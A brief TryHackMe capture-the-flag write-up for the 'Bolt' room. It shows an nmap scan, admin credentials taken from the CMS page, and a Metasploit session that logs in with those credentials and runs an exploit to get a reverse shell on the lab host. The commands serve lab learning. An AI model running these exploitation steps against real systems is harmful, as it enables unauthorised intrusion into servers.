# Write-up: Bolt ([TryHackMe](https://tryhackme.com/room/bolt))

## Description:

In this challenge, we analyze a CMS running on a non-standard port. After gaining access to the admin panel and identifying a vulnerable version, we exploit it using Metasploit and retrieve the flag.

## Scanning:
Full port scan:
```python
nmap -sC -sV -p- -T4 10.10.43.46
```
Open ports:
```python
22/tcp — SSH

80/tcp — HTTP

8000/tcp — HTTP (CMS interface)
```
## Web Exploration:

CMS is accessible on port 8000. On the page, we can easily find username and password (likely in source code or comments).

## Admin Access:
Admin panel is located at:
```python
http://10.10.43.46/bolt/
```
We log in using the found credentials and view the CMS version inside the dashboard.

## Exploit Research:

* Check exploit-db.com for vulnerabilities by version.

* Find a suitable EDB-ID.

In Metasploit:
```python
msfconsole
```
Search for the exploit:

```python
search bolt 0.0.0
```
Select and configure:
```python
use 0
set RHOSTS 10.10.43.46
set LHOST 10.10.10.10
set USERNAME bolt
set PASSWORD boltadmin123
exploit
```
## Result:
We gain shell access and capture the flag.
